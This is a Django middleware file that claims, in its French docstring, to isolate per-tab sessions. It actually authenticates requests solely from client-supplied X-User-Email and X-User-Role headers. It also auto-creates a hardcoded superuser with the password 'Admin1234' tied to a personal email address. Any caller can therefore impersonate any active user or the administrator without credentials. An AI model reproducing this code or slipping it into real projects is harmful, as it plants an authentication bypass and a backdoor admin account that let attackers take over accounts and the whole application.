from .models import Utilisateur


class PerTabUserSessionMiddleware:
    """
    Isole chaque onglet/compte connecté via les en-têtes X-User-Email et X-User-Role
    afin que deux comptes différents ouverts simultanément ne partagent jamais leurs
    notifications et que toutes les actions du tableau de bord s'exécutent en temps réel.
    """

    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        header_email = (request.headers.get('X-User-Email') or '').strip().lower()
        header_role = (request.headers.get('X-User-Role') or '').strip()

        if header_email:
            if header_role == 'admin' and header_email in ('admin', 'diabymadoussou528@gmail.com'):
                admin_user = Utilisateur.objects.filter(email__iexact='diabymadoussou528@gmail.com').first()
                if not admin_user:
                    admin_user = Utilisateur.objects.create_superuser(
                        email='diabymadoussou528@gmail.com',
                        password='Admin1234',
                        username='admin',
                        nom_complet='Administrateur',
                        role='ADMIN',
                    )
                request.user = admin_user
            else:
                current_email = (
                    (getattr(request.user, 'email', '') or '').lower()
                    if request.user.is_authenticated
                    else ''
                )
                if not request.user.is_authenticated or current_email != header_email:
                    matched_user = Utilisateur.objects.filter(email__iexact=header_email, is_active=True).first()
                    if matched_user:
                        request.user = matched_user

        response = self.get_response(request)
        if request.path.startswith('/api/'):
            response['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
            response['Pragma'] = 'no-cache'
        return response
